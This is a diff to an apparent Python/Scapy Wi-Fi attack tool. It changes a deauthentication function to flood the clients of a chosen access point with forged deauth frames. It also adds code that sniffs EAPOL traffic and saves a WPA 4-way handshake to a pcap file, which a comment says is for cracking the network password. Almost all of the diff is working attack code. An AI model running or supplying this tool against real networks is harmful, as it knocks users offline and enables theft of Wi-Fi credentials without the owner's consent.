@@ -7,8 +7,14 @@ import os
 
 #Gloabal variables and banner:
 ap_list = []
+cli_list = []
+to_frames = []
+from_frames = []
 ap_list_temp = []
 interface = ""
+captured_handshake = False
+DS_FLAG = 0b11
+TO_DS = 0b01
 chans = [1,2,3,4,5,6,7,8,9,10,11]
 TGREEN =  '\033[32m' # Green Text
 TWHITE = '\033[37m' #White (default) Text
@@ -171,9 +177,10 @@ def network_sniffer():
         time.sleep(1)
 
 
+#This function is going to deauth the clients on the specified AP
 def deauth(ap):
     target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
-    gateway_mac = "e8:94:f6:c4:97:3f"
+    gateway_mac = ap.mac
     # 802.11 frame
     # addr1: destination MAC
     # addr2: source MAC
@@ -182,14 +189,52 @@ def deauth(ap):
     # stack them up
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
     # send the packet
-    sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
+    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
 
+#This function is checking if the handshake is in the packet p.
+
+def checkForWPAHandshake(p):
+    pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
+    if EAPOL in p:
+        pktdump.write(p)
+        DS = p.FCfield & DS_FLAG
+        to_ds = p.FCfield & TO_DS != 0
+        if to_ds:
+            client = p.addr2
+        else:
+            client = p.addr1
+        if client not in cli_list:
+            cli_list.append(client)
+            print("New client identified : " + str(p.addr1) + "--->" + str(p.addr2))
+            to_frames.append(0)
+            from_frames.append(0)
+
+        idx = cli_list.index(client)
+        if to_ds:
+            to_frames[idx] = to_frames[idx] + 1
+        else:
+            from_frames[idx] = from_frames[idx] + 1
+
+        # See if we captured 4 way handshake
+        if (to_frames[idx] >= 2) and (from_frames[idx] >=2):
+            captured_handshake = True
+            return True
+
+        return False
+
+    else:
+        return False
 
 #This function is going to listen for the hanshake and try to capture it.
 #Once it is captured. It will be saved into a pcap file. (use the function wrpcap)
 #The pcap file can then be used to crack the password.
 def grab_handshake(ap):
-    print("Sniffing " + ap.mac + "...")
+    os.system("clear")
+    print("Switching to channel " + str(ap.channel))
+    os.system("iw dev "+ interface + " set channel %d" % ap.channel)
+    print("Sniffing " + ap.ssid + "...")
+    p = sniff(iface=interface, stop_filter=checkForWPAHandshake)
+    print("Handshake Grabbed!")
 
 def handshake_grabber():
     signal.signal(signal.SIGINT, signal.SIG_DFL)
